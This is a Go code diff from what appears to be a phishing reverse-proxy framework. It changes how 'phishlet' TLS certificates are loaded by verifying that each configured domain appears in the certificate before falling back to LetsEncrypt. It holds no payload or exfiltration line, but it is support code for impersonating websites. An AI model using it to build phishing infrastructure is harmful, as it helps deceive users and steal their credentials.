@@ -246,7 +246,7 @@ func (d *CertDb) SetupPhishletCertificate(site_name string, domains []string) er
 		return fmt.Errorf("phishlet '%s' not found", site_name)
 	}
 
-	err := d.loadPhishletCertificate(site_name, base_domain)
+	err := d.loadPhishletCertificate(site_name, base_domain, domains)
 	if err != nil {
 		log.Warning("failed to load certificate files for phishlet '%s', domain '%s': %v", site_name, base_domain, err)
 		log.Info("requesting SSL/TLS certificates from LetsEncrypt...")
@@ -255,6 +255,7 @@ func (d *CertDb) SetupPhishletCertificate(site_name string, domains []string) er
 			return err
 		}
 	}
+
 	return nil
 }
 
@@ -277,13 +278,35 @@ func (d *CertDb) addPhishletCertificate(site_name string, base_domain string, ce
 	d.phishletCache[base_domain][site_name] = cert
 }
 
-func (d *CertDb) loadPhishletCertificate(site_name string, base_domain string) error {
+func (d *CertDb) loadPhishletCertificate(site_name string, base_domain string, domains []string) error {
 	crt_dir := filepath.Join(d.dataDir, base_domain)
 
 	cert, err := tls.LoadX509KeyPair(filepath.Join(crt_dir, site_name+".crt"), filepath.Join(crt_dir, site_name+".key"))
 	if err != nil {
 		return err
 	}
+	domainExists := false
+	for _, domain := range domains {
+		for _, certb := range cert.Certificate {
+			crt, e := x509.ParseCertificate(certb)
+			if e != nil {
+				return err
+			}
+			for _, dnsname := range crt.DNSNames {
+				if domain == dnsname {
+					domainExists = true
+					break
+				}
+			}
+			if domainExists {
+				break
+			}
+		}
+		if !domainExists {
+			return fmt.Errorf("No certificate for domain %s", domain)
+		}
+		domainExists = false
+    }
 	d.addPhishletCertificate(site_name, base_domain, &cert)
 	return nil
 }
